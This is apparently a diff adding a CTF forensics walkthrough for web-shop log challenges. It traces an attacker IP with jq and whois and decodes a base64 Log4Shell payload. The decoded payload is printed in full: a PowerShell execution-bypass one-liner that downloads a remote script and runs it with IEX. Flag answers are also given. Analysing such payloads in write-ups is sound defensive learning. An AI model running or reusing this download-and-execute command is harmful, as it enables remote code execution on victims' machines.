@@ -1,0 +1,57 @@
+Here are the flags and the walkthrough
+
+#### Shop-Knock Knock Knock 
+Okay then, this should be something easy... lets look for a bunch of logins from the same ip.
+You could use something like this or even look into the file...
+```shell
+cat DownUnderShop.JSON# | jq '. | .origin, .url' | grep -B1 login
+```
+Then you will see, that the IP of the attacker should be `58.164.62.91`.
+So now we can use `whois`
+
+```shell
+whois 58.164.62.91                                                                                                                2 ✘  10s  
+% [whois.apnic.net]
+% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html
+
+% Information related to '58.160.0.0 - 58.175.255.255'
+
+% Abuse contact for '58.160.0.0 - 58.175.255.255' is 'abuse@telstra.net'
+
+inetnum:        58.160.0.0 - 58.175.255.255
+netname:        TELSTRAINTERNET42-AU
+descr:          Telstra Internet
+descr:          Locked Bag 5744
+descr:          Canberra
+descr:          ACT 2601
+[...]
+mnt-by:         APNIC-HM
+mnt-lower:      MAINT-AU-TIAR-AP
+mnt-routes:     MAINT-AU-TIAR-AP
+mnt-irt:        IRT-TELSTRA-AU
+last-modified:  2020-12-07T03:21:06Z
+source:         APNIC
+
+irt:            IRT-TELSTRA-AU
+address:        Telstra Internet
+e-mail:         abuse@telstra.net
+abuse-mailbox:  abuse@telstra.net
+```
+
+The flag should be 
+> flag: `abuse@telstra.net`
+
+#### Shop-Logging for what?
+
+Found in line `2675` a strange JNDI request... looks like Log4Shell or something.
+
+```shell
+echo "cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=" | base64 -d
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');"%
+```
+
+> flag: pTCNp5p6LP0d7qA77yvb4SHf40
+
+#### Shop-I'm just looking!
+
+
